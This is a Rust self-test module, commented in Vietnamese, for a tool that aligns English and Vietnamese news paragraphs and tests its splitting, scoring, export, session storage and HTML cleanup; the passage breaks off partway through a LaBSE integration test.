//! selftest.rs — bộ tự kiểm nội bộ (chạy qua GET /api/selftest).
//!
//! Bao gồm regression cho các lỗi người dùng báo ở bản 1.x:
//!   * `regression_panic_index_61`  — panic "index out of bounds: len 61, index usize::MAX"
//!   * `multi_article_sequence`     — ghép+xuất bài 1 tốt, sang bài 2 bị "Không ghép được."
//!   * `t_boilerplate_filter`       — nút Ghép bị mờ sau khi tải URL (bản 2.1)
//! Bản 2.2 thêm: `t_labse_integration` — hoà trộn điểm LaBSE + đường ống HTTP thật
//! qua dịch vụ nhúng GIẢ LẬP (không cần tải model ~2 GB).
//! Bản 2.3 thêm: `t_list_items_extract` — hồi quy "tải URL mất mục danh sách <li>"
//! (bài SBS chỉ lấy được câu dẫn, 3 gạch đầu dòng bị bỏ);
//! `t_export_new_formats` — xuất CSV/HTML/XLIFF (BOM, escape RFC 4180, tô màu 3 mức, none nguyên văn).
//! Bản 2.4 thêm 4 bài gộp hàng (kéo–thả): gộp liền kề + xuất 6 định dạng,
//! kịch bản 1 EN ↔ nhiều VI (SBS), gộp–rồi–tách đủ đoạn gốc, gộp cùng phía + xác nhận một phía.
//! Bản 2.5 thêm 5 bài MÔ HÌNH KHỐI: di chuyển khối + hoàn tác/làm lại,
//! tách khối thành hàng riêng (prune hàng rỗng), Rescan chấm lại điểm (LaBSE giả lập),
//! xuất sau khi đổi thứ tự (tha thứ I3, I1 vẫn gắt), và bộ lỗi đầu vào của move_block.
//! Bản 2.7 thêm 2 bài Excel (.xlsx): tô màu ô theo trạng thái hàng + hàng gộp —
//! đọc lại file zip thật (styles/sheet/sharedStrings) kiểm chứng fill từng hàng.
//! [AUDIT 2026-10-18] thêm 4 bài: CSV/TSV chống chèn công thức (=+-@), xlsx ghi chuỗi
//! chứ không phải công thức, loại ký tự điều khiển (XLIFF/HTML hợp lệ), chặn SSRF
//! (địa chỉ nội bộ) + phân giải redirect.
//!
//! BẢN 2.9 thêm 4 bài THỐNG KÊ SỐ TỪ (căn cứ tính giá dịch — docs/PLAN-QOL-2026-10-19.md):
//! corpus chuẩn ra đúng số đếm tay, quy ước biên NFD/NFC/CRLF/emoji ZWJ,
//! phân vùng hàng paired/một-phía, thuần đọc + 10.000 đoạn < 300 ms.
//! BẢN 2.9 thêm 6 bài BẢNG SOÁT LỖI QA (8 kiểm chuẩn ngành — §3.2): dương tính
//! từng loại, âm tính (không báo oan), biên số liệu hai phía, hàng một phía,
//! thuần đọc + không phụ thuộc LaBSE, hiệu năng 10.000 đoạn < 1 s.

use crate::aligner::{self, AlignOptions, Row, Seg, Status};
use crate::exporter::{export_session, ExportFormat};
use crate::fetcher;
use crate::qa::{self, Severity};
use crate::session::{derive_title, find_match_ranges, generate_id, Session, SessionStore, Side};
use crate::stats;
use serde::Serialize;
use std::io::Read;
use std::time::{Instant, SystemTime, UNIX_EPOCH};
use unicode_normalization::UnicodeNormalization;

#[derive(Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct TestResult {
    pub name: String,
    pub passed: bool,
    pub duration_ms: u64,
    pub detail: String,
}

// ========================= Dữ liệu mẫu =========================

const EN_ARTICLE: &[&str] = &[
    "Hanoi hosted the Green Tech Summit 2025 from March 12 to March 15, drawing more than 4,000 participants from 32 countries.",
    "Organizers said the event focused on clean energy, electric vehicles, and artificial intelligence applications in agriculture.",
    "Prime Minister Pham Minh Chinh delivered the opening speech, calling for stronger cooperation between Southeast Asian nations.",
    "More than 150 startups presented their products across three exhibition halls at the National Convention Center.",
    "Vietnamese electric vehicle maker VinFast introduced two new electric scooter models priced at 25 million dong.",
    "German energy firm Siemens signed a memorandum of understanding worth 120 million euros with Hanoi authorities.",
    "A panel on artificial intelligence drew criticism after organizers failed to invite any Vietnamese researchers.",
    "Attendance dropped 8 percent compared with the 2024 summit, largely because of visa delays for Chinese participants.",
    "The city government announced that the summit will return in March 2026 with an expected 6,000 visitors.",
    "Hotels near the venue reported occupancy above 90 percent during the four-day event.",
];

/// Bản dịch — CÙNG 9 đoạn nhưng BỎ đoạn thứ 7 (index 6) của bản Anh
/// để kiểm tra hàng "none" khi thiếu một bên.
const VI_ARTICLE: &[&str] = &[
    "Hà Nội tổ chức Hội nghị Công nghệ Xanh 2025 từ ngày 12 tháng 3 đến 15 tháng 3, thu hút hơn 4.000 người tham dự từ 32 quốc gia.",
    "Ban tổ chức cho biết sự kiện tập trung vào năng lượng sạch, xe điện và ứng dụng trí tuệ nhân tạo trong nông nghiệp.",
    "Thủ tướng Phạm Minh Chính phát biểu khai mạc, kêu gọi tăng cường hợp tác giữa các quốc gia Đông Nam Á.",
    "Hơn 150 startup giới thiệu sản phẩm tại ba gian triển lãm ở Trung tâm Hội nghị Quốc gia.",
    "Hãng xe điện Việt Nam VinFast ra mắt hai mẫu xe máy điện mới với giá 25 triệu đồng.",
    "Tập đoàn năng lượng Đức Siemens ký biên bản ghi nhớ trị giá 120 triệu euro với chính quyền Hà Nội.",
    // (đoạn 7 của bản Anh KHÔNG có bản dịch)
    "Lượt tham dự giảm 8 phần trăm so với hội nghị 2024, chủ yếu do chậm cấp thị thực cho người tham dự Trung Quốc.",
    "Chính quyền thành phố thông báo hội nghị sẽ trở lại vào tháng 3 năm 2026 với 6.000 khách dự kiến.",
    "Các khách sạn quanh địa điểm tổ chức ghi nhận công suất trên 90 phần trăm trong bốn ngày sự kiện.",
];

fn corpus_en() -> String {
    EN_ARTICLE.join("\n\n")
}
fn corpus_vi() -> String {
    VI_ARTICLE.join("\n\n")
}

/// Sinh văn bản giả định (LCG tất định) để stress-test.
fn lcg_next(state: &mut u64) -> u64 {
    *state = state
        .wrapping_mul(6364136223846793005)
        .wrapping_add(1442695040888963407);
    *state >> 33
}

fn synthetic_paragraphs(seed: u64, count: usize) -> String {
    let mut state = seed;
    let mut out: Vec<String> = Vec::with_capacity(count);
    for k in 0..count {
        let year = 1990 + (lcg_next(&mut state) % 40);
        let money = 10 + (lcg_next(&mut state) % 900);
        let name_idx = lcg_next(&mut state) % 5;
        let names = [
            "Alpha Corp",
            "Beta Group",
            "Gamma Ltd",
            "Delta Fund",
            "Epsilon AG",
        ];
        out.push(format!(
            "Report {} says {} shipped {} units in {} worth {} million dollars.",
            k + 1,
            names[name_idx as usize],
            100 + k,
            year,
            money
        ));
    }
    out.join("\n\n")
}

fn temp_store(tag: &str) -> SessionStore {
    let dir = std::env::temp_dir().join(format!(
        "cdav-selftest-{}-{}",
        tag,
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0)
    ));
    SessionStore::open(dir)
}

fn align_to_session(store: &SessionStore, en: &str, vi: &str) -> Result<Session, String> {
    let out = aligner::align(en, vi, &AlignOptions::default()).map_err(|e| e.0)?;
    let engine = out.engine.clone();
    let title = derive_title(&out.english, &out.vietnamese);
    let mut session = Session::from_align(
        generate_id(),
        title,
        out.english,
        out.vietnamese,
        out.rows,
        out.options,
    );
    session.engine = engine;
    store.create(&session).map_err(|e| e.to_string())?;
    Ok(store.get(&session.id).expect("phiên vừa tạo phải tồn tại"))
}

// ========================= Từng bài kiểm =========================

fn t_split_paragraphs() -> Result<(), String> {
    let a = aligner::split_paragraphs("Đoạn một.\n\nĐoạn hai.\n\n\nĐoạn ba.");
    if a.len() != 3 {
        return Err(format!("kỳ vọng 3 đoạn, được {}", a.len()));
    }
    let b = aligner::split_paragraphs("Dòng một\nDòng hai\nDòng ba");
    if b.len() != 3 {
        return Err(format!("fallback dòng: kỳ vọng 3, được {}", b.len()));
    }
    let c = aligner::split_paragraphs("Mot\r\n\r\nHai\r\n\r\nBa");
    if c.len() != 3 {
        return Err(format!("CRLF: kỳ vọng 3, được {}", c.len()));
    }
    let d = aligner::split_paragraphs("");
    if !d.is_empty() {
        return Err("chuỗi rỗng phải không có đoạn nào".into());
    }
    Ok(())
}

fn t_invariants_corpus() -> Result<(), String> {
    let out =
        aligner::align(&corpus_en(), &corpus_vi(), &AlignOptions::default()).map_err(|e| e.0)?;
    aligner::validate_invariants(&out)?;
    let unmatched_en = out
        .rows
        .iter()
        .filter(|r| r.en_index.is_some() && r.vi_index.is_none())
        .count();
    if unmatched_en != 1 {
        return Err(format!(
            "kỳ vọng đúng 1 đoạn Anh không có bản dịch (đoạn 7), được {}",
            unmatched_en
        ));
    }
    // đoạn Anh bị thiếu phải là index 6
    let miss = out
        .rows
        .iter()
        .find(|r| r.en_index.is_some() && r.vi_index.is_none())
        .and_then(|r| r.en_index);
    if miss != Some(6) {
        return Err(format!("đoạn Anh thiếu kỳ vọng 6, được {:?}", miss));
    }
    Ok(())
}

fn t_quality_auto_matched() -> Result<(), String> {
    let out =
        aligner::align(&corpus_en(), &corpus_vi(), &AlignOptions::default()).map_err(|e| e.0)?;
    let c = count_statuses(&out.rows);
    // 9 cặp có thể ghép; yêu cầu ít nhất 7 đạt "tự khớp"
    if c.auto < 7 {
        return Err(format!(
            "chất lượng thấp: chỉ {} cặp tự khớp / 9 (needs_review={}, unmatched={})",
            c.auto, c.needs, c.unmat
        ));
    }
    // ghép đúng các cặp tương ứng (k<6: k↔k; k>=7: k↔k-1)
    for k in 0..6usize {
        check_pair(&out.rows, k, Some(k))?;
    }
    for k in 7..10usize {
        check_pair(&out.rows, k, Some(k - 1))?;
    }
    Ok(())
}

fn t_export_none_literal() -> Result<(), String> {
    let store = temp_store("export");
    let session = align_to_session(&store, &corpus_en(), &corpus_vi())?;
    for fmt in [ExportFormat::Tsv, ExportFormat::Moses] {
        let r = export_session(&session, fmt)?;
        let lines: Vec<&str> = r.content.trim_end_matches('\n').split('\n').collect();
        if lines.len() != session.rows.len() {
            return Err(format!(
                "{:?}: {} dòng ≠ {} hàng",
                fmt,
                lines.len(),
                session.rows.len()
            ));
        }
        let sep = match fmt {
            ExportFormat::Tsv => '\t',
            _ => '|', // moses: kiểm tra bằng " ||| "
        };
        for (li, line) in lines.iter().enumerate() {
            let (en, vi) = match fmt {
                ExportFormat::Tsv => {
                    let mut it = line.splitn(2, '\t');
                    (it.next().unwrap_or(""), it.next().unwrap_or(""))
                }
                ExportFormat::Moses => {
                    let mut it = line.splitn(2, " ||| ");
                    (it.next().unwrap_or(""), it.next().unwrap_or(""))
                }
                _ => unreachable!(),
            };
            if en.is_empty() || vi.is_empty() {
                return Err(format!(
                    "{:?}: dòng {} có phía rỗng (phải là 'none')",
                    fmt, li
                ));
            }
            let row = &session.rows[li];
            if row.en.is_none() && en != "none" {
                return Err(format!(
                    "{:?}: dòng {} phía Anh phải là 'none', được '{}'",
                    fmt, li, en
                ));
            }
            if row.vi.is_none() && vi != "none" {
                return Err(format!(
                    "{:?}: dòng {} phía Việt phải là 'none', được '{}'",
                    fmt, li, vi
                ));
            }
            if row.en.is_some() && en == "none" {
                return Err(format!(
                    "{:?}: dòng {} phía Anh là văn bản nhưng xuất 'none'",
                    fmt, li
                ));
            }
            let _ = sep;
        }
        if r.none_count != 1 {
            return Err(format!(
                "{:?}: kỳ vọng đúng 1 'none', được {}",
                fmt, r.none_count
            ));
        }
    }
    // JSON
    let r = export_session(&session, ExportFormat::Json)?;
    let v: serde_json::Value = serde_json::from_str(&r.content).map_err(|e| e.to_string())?;
    let rows = v
        .get("rows")
        .and_then(|x| x.as_array())
        .ok_or("JSON thiếu rows")?;
    if rows.len() != session.rows.len() {
        return Err("JSON rows sai số lượng".into());
    }
    let none_count = rows
        .iter()
        .filter(|x| {
            x.get("en").and_then(|e| e.as_str()) == Some("none")
                || x.get("vi").and_then(|e| e.as_str()) == Some("none")
        })
        .count();
    if none_count != 1 {
        return Err(format!("JSON: kỳ vọng 1 'none', được {}", none_count));
    }
    Ok(())
}

fn t_export_single_side() -> Result<(), String> {
    let out = aligner::align("Alpha beta gamma.", "", &AlignOptions::default()).map_err(|e| e.0)?;
    if out.rows.len() != 1 || out.rows[0].vi.is_some() {
        return Err("một phía: phải có 1 hàng chỉ tiếng Anh".into());
    }
    let store = temp_store("single");
    let session = Session::from_align(
        generate_id(),
        "t".into(),
        out.english,
        out.vietnamese,
        out.rows,
        out.options,
    );
    store.create(&session).map_err(|e| e.to_string())?;
    let r = export_session(&session, ExportFormat::Tsv)?;
    let line = r.content.trim_end_matches('\n');
    if !line.ends_with("\tnone") {
        return Err(format!("phía Việt phải là 'none', được '{}'", line));
    }
    Ok(())
}

fn t_both_empty_error() -> Result<(), String> {
    match aligner::align("", "", &AlignOptions::default()) {
        Err(e) if !e.0.is_empty() => Ok(()),
        Ok(_) => Err("hai bên rỗng phải báo lỗi".into()),
        Err(e) => Err(format!("thông báo lỗi lạ: {}", e.0)),
    }
}

fn t_regression_panic_index_61() -> Result<(), String> {
    // Tái hiện đúng hiện tượng của bản 1.x: EN 61 đoạn, VI 30 đoạn
    // ("the len is 61 but the index is 18446744073709551615").
    // Ghép 2 LẦN LIÊN TIẾP trên cùng đầu vào + đảo chiều — không được panic.
    for (en, vi) in [
        (61usize, 30usize),
        (30, 61),
        (61, 61),
        (61, 1),
        (1, 61),
        (0, 61),
        (61, 0),
    ] {
        let a = synthetic_paragraphs(11, en);
        let b = synthetic_paragraphs(22, vi);
        for _round in 0..2 {
            let out = aligner::align(&a, &b, &AlignOptions::default())
                .map_err(|e| format!("({},{}) lỗi: {}", en, vi, e.0))?;
            aligner::validate_invariants(&out).map_err(|e| format!("({},{}) {}", en, vi, e))?;
        }
        // đảo
        let out2 = aligner::align(&b, &a, &AlignOptions::default())
            .map_err(|e| format!("đảo ({},{}) lỗi: {}", en, vi, e.0))?;
        aligner::validate_invariants(&out2)?;
    }
    Ok(())
}

fn t_multi_article_sequence() -> Result<(), String> {
    // Tái hiện lỗi: ghép bài 1 -> xuất tốt -> ghép bài 2 bị "Không ghép được."
    let store = temp_store("seq");
    // bài 1
    let s1 = align_to_session(&store, &corpus_en(), &corpus_vi())?;
    let _ = export_session(&s1, ExportFormat::Tsv)?;
    let _ = export_session(&s1, ExportFormat::Json)?;
    // bài 2 — KHÁC kích thước (61 vs 30) như crash của người dùng
    let s2 = align_to_session(
        &store,
        &synthetic_paragraphs(7, 61),
        &synthetic_paragraphs(8, 30),
    )?;
    let _ = export_session(&s2, ExportFormat::Moses)?;
    // bài 3 — cùng nội dung bài 1 lần nữa
    let s3 = align_to_session(&store, &corpus_en(), &corpus_vi())?;
    let _ = export_session(&s3, ExportFormat::Tsv)?;
    // bài 4 — một phía
    let s4 = align_to_session(&store, &synthetic_paragraphs(9, 25), "")?;
    let _ = export_session(&s4, ExportFormat::Tsv)?;
    if store.count() < 4 {
        return Err("các phiên phải độc lập và cùng tồn tại".into());
    }
    Ok(())
}

fn t_status_update_flow() -> Result<(), String> {
    let store = temp_store("status");
    let mut s = align_to_session(&store, &corpus_en(), &corpus_vi())?;
    let n0 = s.rows.len();
    // xác nhận cặp đầu
    s.set_row_status(0, Status::HumanConfirmed)
        .map_err(|e| e.to_string())?;
    if s.rows[0].status != Status::HumanConfirmed || s.rows[0].vi_index.is_none() {
        return Err("human_confirmed không giữ cặp".into());
    }
    // bỏ ghép cặp đầu -> TÁCH thành 2 hàng
    s.set_row_status(0, Status::Unmatched)
        .map_err(|e| e.to_string())?;
    if s.rows.len() != n0 + 1 {
        return Err(format!("tách cặp: {} hàng ≠ {}", s.rows.len(), n0 + 1));
    }
    if !(s.rows[0].en_index.is_some() && s.rows[0].vi_index.is_none()) {
        return Err("hàng tách phía Anh sai cấu trúc".into());
    }
    if !(s.rows[1].en_index.is_none() && s.rows[1].vi_index.is_some()) {
        return Err("hàng tách phía Việt sai cấu trúc".into());
    }
    // reindex
    for (i, r) in s.rows.iter().enumerate() {
        if r.index != i {
            return Err(format!("reindex sai tại {}", i));
        }
    }
    // hàng một phía: cho phép human_confirmed
    s.set_row_status(0, Status::HumanConfirmed)
        .map_err(|e| e.to_string())?;
    // hàng một phía: KHÔNG cho phép needs_review
    if s.set_row_status(1, Status::NeedsReview).is_ok() {
        return Err("hàng một phía không được nhận needs_review".into());
    }
    // hàng ngoài phạm vi
    if s.set_row_status(9999, Status::HumanConfirmed).is_ok() {
        return Err("chỉ số hàng ngoài phạm vi phải lỗi".into());
    }
    Ok(())
}

fn t_session_release_and_persist() -> Result<(), String> {
    let dir = std::env::temp_dir().join(format!(
        "cdav-selftest-rel-{}",
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0)
    ));
    {
        let store = SessionStore::open(dir.clone());
        let s = align_to_session(&store, &corpus_en(), &corpus_vi())?;
        if store.get(&s.id).is_none() {
            return Err("get() phải trả phiên vừa tạo".into());
        }
        if store.list().is_empty() {
            return Err("list() phải có ít nhất 1 phiên".into());
        }
        // NHẢ PHIÊN
        if !store.delete(&s.id) {
            return Err("delete() phải trả true".into());
        }
        if store.get(&s.id).is_some() {
            return Err("sau khi nhả, get() phải là None".into());
        }
        // tạo lại rồi kiểm tra persist qua khởi động lại store
        let s2 = align_to_session(&store, &corpus_en(), &corpus_vi())?;
        let s3 = align_to_session(&store, &corpus_vi(), &corpus_en())?;
        let _ = s3;
        let file = dir.join(format!("{}.json", s2.id));
        if !file.exists() {
            return Err("file phiên phải tồn tại trên đĩa".into());
        }
    }
    // mở lại
    {
        let store2 = SessionStore::open(dir.clone());
        if store2.count() != 2 {
            return Err(format!(
                "khởi động lại phải thấy 2 phiên, được {}",
                store2.count()
            ));
        }
        let n = store2.delete_all();
        if n != 2 {
            return Err(format!("delete_all phải xoá 2 phiên, được {}", n));
        }
        if store2.count() != 0 {
            return Err("sau delete_all phải rỗng".into());
        }
    }
    let _ = std::fs::remove_dir_all(&dir);
    Ok(())
}

fn t_threshold_clamp() -> Result<(), String> {
    let opts = AlignOptions {
        auto_threshold: 99.0,
    }
    .clamped();
    if (opts.auto_threshold - 0.90).abs() > 1e-9 {
        return Err(format!("clamp trên sai: {}", opts.auto_threshold));
    }
    let opts2 = AlignOptions {
        auto_threshold: -5.0,
    }
    .clamped();
    if (opts2.auto_threshold - 0.05).abs() > 1e-9 {
        return Err(format!("clamp dưới sai: {}", opts2.auto_threshold));
    }
    // ngưỡng cao -> mọi cặp thành needs_review; ngưỡng thấp -> auto
    let out_hi = aligner::align(
        &corpus_en(),
        &corpus_vi(),
        &AlignOptions {
            auto_threshold: 0.9,
        },
    )
    .map_err(|e| e.0)?;
    let out_lo = aligner::align(
        &corpus_en(),
        &corpus_vi(),
        &AlignOptions {
            auto_threshold: 0.05,
        },
    )
    .map_err(|e| e.0)?;
    let ch = count_statuses(&out_hi.rows);
    let cl = count_statuses(&out_lo.rows);
    if ch.auto >= cl.auto {
        return Err(format!(
            "ngưỡng cao phải ít auto hơn ({} vs {})",
            ch.auto, cl.auto
        ));
    }
    Ok(())
}

fn t_fold_and_numbers() -> Result<(), String> {
    let cases = [
        ("Hà Nội", "ha noi"),
        ("Đà Nẵng", "da nang"),
        ("trường", "truong"),
        ("PHẠM Minh Chính", "pham minh chinh"),
    ];
    for (a, b) in cases {
        if crate::fold::fold_lower(a) != b {
            return Err(format!("fold '{}' ≠ '{}'", a, b));
        }
    }
    if crate::fold::fold_number_token("4,000").as_deref() != Some("4000") {
        return Err("4,000 phải fold thành 4000".into());
    }
    if crate::fold::fold_number_token("4.000").as_deref() != Some("4000") {
        return Err("4.000 phải fold thành 4000".into());
    }
    Ok(())
}

fn t_numbers_alignment() -> Result<(), String> {
    // hai đoạn chỉ khác nhau về ngữ cảnh nhưng cùng bộ số -> phải khớp hơn đoạn khác
    let en = "The factory produced 12,500 units in 2023 and earned 3.2 million.\n\nMeanwhile the weather was nice and people walked along the beach all afternoon.";
    let vi = "Nhà máy sản xuất 12.500 sản phẩm năm 2023 và thu về 3,2 triệu.\n\nTrong khi đó thời tiết đẹp và mọi người đi dạo вдоль bãi biển suốt buổi chiều.";
    let out = aligner::align(en, vi, &AlignOptions::default()).map_err(|e| e.0)?;
    if out.rows.len() != 2 {
        return Err(format!("kỳ vọng 2 cặp, được {}", out.rows.len()));
    }
    let s0 = out.rows[0].score.unwrap_or(0.0);
    let s1 = out.rows[1].score.unwrap_or(0.0);
    if s0 <= s1 {
        return Err(format!(
            "đoạn nhiều số phải điểm cao hơn ({} vs {})",
            s0, s1
        ));
    }
    if out.rows[0].status != Status::AutoMatched {
        return Err(format!("cặp số liệu phải tự khớp (điểm {})", s0));
    }
    Ok(())
}

fn t_html_extract() -> Result<(), String> {
    let html = r##"
<html><head><title>Tin tức hôm nay</title><style>.a{color:red}</style></head>
<body>
<script>var x = 1; alert('bỏ tôi');</script>
<nav><a href="#">Menu</a></nav>
<article>
<h1>Bài viết quan trọng về công nghệ</h1>
<p>Đây là <b>đoạn thứ nhất</b> có đủ &amp; ký tự đặc biệt &#x1ECB; và độ dài hơn ba mươi ký tự.</p>
<p style="margin:0">Đây là đoạn thứ hai, dài hơn ba mươi ký tự để được giữ lại.&nbsp;</p>
<div>
    <p>Đoạn thứ ba nằm trong div cũng đủ dài để được giữ lại nguyên vẹn.</p>
</div>
<p>Ngắn.</p>
</article>
</body></html>
"##;
    let (title, paras) = fetcher::extract(html);
    if title != "Tin tức hôm nay" {
        return Err(format!("title sai: '{}'", title));
    }
    if paras.len() != 3 {
        return Err(format!(
            "kỳ vọng 3 đoạn (bỏ 'Ngắn.'), được {}: {:?}",
            paras.len(),
            paras
        ));
    }
    if paras[0].contains("<b>") || paras[0].contains("bỏ tôi") || paras[0].contains("color:red")
    {
        return Err(format!("thẻ/script phải được bỏ: '{}'", paras[0]));
    }
    if !paras[0].contains("& thị") && !paras[0].contains("ị") {
        return Err(format!("thực thể phải được giải mã: '{}'", paras[0]));
    }
    Ok(())
}

fn t_boilerplate_filter() -> Result<(), String> {
    // Mô phỏng một trang tin có lẫn chrom giao diện (giống SBS) xen giữa nội dung thật.
    let html = r##"
<html><head><title>Bài báo mẫu có lẫn chrom</title></head><body><article>
<p>SBS acknowledges the Traditional Custodians of Country and their connections and continuous care for the skies, lands and waterways throughout Australia.</p>
<p>Published 3 February 2025 1:05pm</p>
<p>Updated 3 February 2025 4:03pm</p>
<p>Share this with family and friends</p>
<p>Tens of millions of dollars of donations went to political parties during the last financial year, according to new figures.</p>
<p>By subscribing, you agree to SBS's terms of service and privacy policy including receiving email updates and offers.</p>
<p>Sign up now for daily news from Australia and around the world delivered straight to your inbox.</p>
<p>Labor and its state branches raked in 67.5 million dollars in 2023/24, the Coalition banked more than 73 million.</p>
<p>Get the latest with our News podcasts on your favourite podcast apps.</p>
<p>Take a global view with Australia's most comprehensive world news service.</p>
<p>Locked Bag 028,Crows Nest NSW 1585</p>
<p>Đã xuất bản 3/2/2025 14:23</p>
<p>Chia sẻ bài viết này với gia đình và bạn bè của bạn.</p>
<p>Published reports suggest the reform will return to the Senate soon, which is a genuine article sentence.</p>
</article></body></html>
"##;
    let (_title, paras) = fetcher::extract(html);
    let joined = paras.join("\n");
    // các đoạn thật phải được GIỮ (kể cả "Published reports…" vì sau nhãn không phải số)
    for must_keep in [
        "Tens of millions of dollars",
        "Labor and its state branches",
        "Published reports suggest",
    ] {
        if !joined.contains(must_keep) {
            return Err(format!(
                "đoạn thật '{}' bị lọc nhầm — không được phép",
                must_keep
            ));
        }
    }
    // chrom phải bị BỎ toàn bộ
    for must_drop in [
        "acknowledges the Traditional Custodians",
        "Published 3 February 2025",
        "Updated 3 February 2025",
        "Share this with",
        "By subscribing",
        "Sign up now for",
        "Get the latest with our",
        "Take a global view",
        "Locked Bag",
        "Đã xuất bản",
        "Chia sẻ bài viết",
    ] {
        if joined.contains(must_drop) {
            return Err(format!("chrom '{}' phải bị lượt bỏ khi tải URL", must_drop));
        }
    }
    if paras.len() != 3 {
        return Err(format!(
            "kỳ vọng đúng 3 đoạn nội dung thật, được {}: {:?}",
            paras.len(),
            paras
        ));
    }
    Ok(())
}

fn t_stress_fuzz() -> Result<(), String> {
    // 24 cặp kích thước ngẫu nhiên (tất định) — không panic, không sai bất biến
    let mut seed = 20250315u64;
    for k in 0..24 {
        seed = seed.wrapping_mul(6364136223846793005).wrapping_add(1);
        let r = seed >> 33;
        let en_n = (r % 80) as usize;
        let vi_n = ((r >> 16) % 80) as usize;
        let a = synthetic_paragraphs(seed % 1000, en_n);
        let b = synthetic_paragraphs((seed >> 10) % 1000, vi_n);
        if en_n == 0 && vi_n == 0 {
            continue; // đã có test riêng
        }
        let out = aligner::align(&a, &b, &AlignOptions::default())
            .map_err(|e| format!("lần {}: {}", k, e.0))?;
        aligner::validate_invariants(&out).map_err(|e| format!("lần {}: {}", k, e))?;
    }
    Ok(())
}

fn t_status_enum_contract() -> Result<(), String> {
    // quy ước trạng thái: đúng 4 giá trị, parse từ chuỗi chuẩn
    let expect = [
        "auto_matched",
        "needs_review",
        "unmatched",
        "human_confirmed",
    ];
    for s in expect {
        if Status::parse(s).is_none() {
            return Err(format!("thiếu trạng thái '{}'", s));
        }
    }
    for s in ["AUTO_MATCHED", "", "matched", "auto"] {
        if Status::parse(s).is_some() {
            return Err(format!("chuỗi lạ '{}' phải bị từ chối", s));
        }
    }
    // as_str đối xứng
    for st in aligner::ALL_STATUSES {
        if Status::parse(st.as_str()) != Some(st) {
            return Err("as_str/parse không đối xứng".into());
        }
    }
    Ok(())
}

fn t_export_after_split() -> Result<(), String> {
    // tách cặp rồi xuất — 'none' phải xuất hiện đúng 2 dòng liên tiếp
    let store = temp_store("split");
    let mut s = align_to_session(&store, &corpus_en(), &corpus_vi())?;
    s.set_row_status(0, Status::Unmatched)
        .map_err(|e| e.to_string())?;
    store.save(&s).map_err(|e| e.to_string())?;
    let r = export_session(&s, ExportFormat::Tsv)?;
    let lines: Vec<&str> = r.content.trim_end_matches('\n').split('\n').collect();
    let none_lines: Vec<usize> = lines
        .iter()
        .enumerate()
        .filter(|(_, l)| l.ends_with("\tnone") || l.starts_with("none\t"))
        .map(|(i, _)| i)
        .collect();
    // 1 (đoạn 7 thiếu) + 2 (cặp 0 bị tách) = 3 dòng chứa none
    if none_lines.len() != 3 {
        return Err(format!(
            "kỳ vọng 3 dòng chứa none, được {}: {:?}",
            none_lines.len(),
            none_lines
        ));
    }
    // hai dòng tách phải kề nhau và đúng thứ tự EN-trước-VI
    let adjacent = none_lines.windows(2).any(|w| w[0] + 1 == w[1]);
    if !adjacent {
        return Err(format!("hai dòng tách phải kề nhau: {:?}", none_lines));
    }
    Ok(())
}

// ========================= Chạy toàn bộ =========================

struct Counts {
    auto: usize,
    needs: usize,
    unmat: usize,
    human: usize,
}

fn count_statuses(rows: &[crate::aligner::Row]) -> Counts {
    let mut c = Counts {
        auto: 0,
        needs: 0,
        unmat: 0,
        human: 0,
    };
    for r in rows {
        match r.status {
            Status::AutoMatched => c.auto += 1,
            Status::NeedsReview => c.needs += 1,
            Status::Unmatched => c.unmat += 1,
            Status::HumanConfirmed => c.human += 1,
        }
    }
    c
}

fn check_pair(rows: &[crate::aligner::Row], en: usize, vi: Option<usize>) -> Result<(), String> {
    let row = rows
        .iter()
        .find(|r| r.en_index == Some(en))
        .ok_or_else(|| format!("không tìm thấy hàng cho đoạn EN {}", en))?;
    if row.vi_index != vi {
        return Err(format!(
            "đoạn EN {} phải ghép với VI {:?}, được {:?}",
            en, vi, row.vi_index
        ));
    }
    Ok(())
}

// ========================= 19. LaBSE (tích hợp, bản 2.2) =========================

/// Tìm vị trí chuỗi con trong buffer byte (dùng cho mock HTTP server nhỏ).
fn find_subslice(hay: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || hay.len() < needle.len() {
        return None;
    }
    (0..=hay.len() - needle.len()).find(|&i| &hay[i..i + needle.len()] == needle)
}

/// Kiểm tra tích hợp LaBSE mà KHÔNG cần tải model thật (~2 GB):
/// * Phần A — đối chiếu CÔNG THỨC hoà trộn điểm (align_with_emb trực tiếp).
/// * Phần B — đường ống HTTP THẬT qua dịch vụ nhúng GIẢ LẬP: health -> /embed ->
///   cosine -> hoà trộn -> nhãn engine "lexical+labse"; ma trận sai kích thước
///   phải bị bỏ qua an toàn (fallback từ vựng, không panic).
fn t_labse_integration() -> Result<(), String> {
    let result = t_labse_integration_inner();
    // dọn mọi đường (kể cả khi bài kiểm fail sớm giữa chừng)
    std::env::remove_var("CANH_DOI_LABSE_URL");
    crate::embedder::invalidate_health_cache();
    result
}

fn t_labse_integration_inner() -> Result<(), String> {
    use std::collections::HashMap;
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::{Arc, Mutex as StdMutex};

    // ---------- Phần A: công thức hoà trộn (không cần HTTP) ----------
    let en = "Alpha company shipped 100 units in 2025.";
    let vi = "Công ty Alpha xuất xưởng 100 sản phẩm năm 2025.";
    let opts = AlignOptions::default();
    let out_lex = aligner::align(en, vi, &opts).map_err(|e| e.0)?;
    if out_lex.engine != "lexical" {
        return Err(format!(
            "không có LaBSE phải ghi engine \"lexical\", được {:?}",
            out_lex.engine
        ));
    }
    let s_lex = out_lex.rows[0].score.ok_or("hàng 0 phải có điểm")?;

    let cos_one = vec![1.0f64];
    let cos_zero = vec![0.0f64];
    let out_one = aligner::align_with_emb(en, vi, &opts, Some(&cos_one)).map_err(|e| e.0)?;
    let out_zero = aligner::align_with_emb(en, vi, &opts, Some(&cos_zero)).map_err(|e| e.0)?;
    let s_one = out_one.rows[0].score.ok_or("hàng 0 (cos=1) phải có điểm")?;
    let s_zero = out_zero.rows[0]
        .score
        .ok_or("hàng 0 (cos=0) phải có điểm")?;
    // Công thức công khai (bản 2.2): điểm = max(từ_vựng, 0.4*từ_vựng + 0.6*tin_cậy)
    //   * cos=1.0 -> tin_cậy=1 -> 0.4*s_lex + 0.6  (được NÂNG lên)
    //   * cos=0.0 -> tin_cậy=0 -> sàn từ vựng s_lex (GIỮ NGUYÊN — LaBSE không được HẠ)
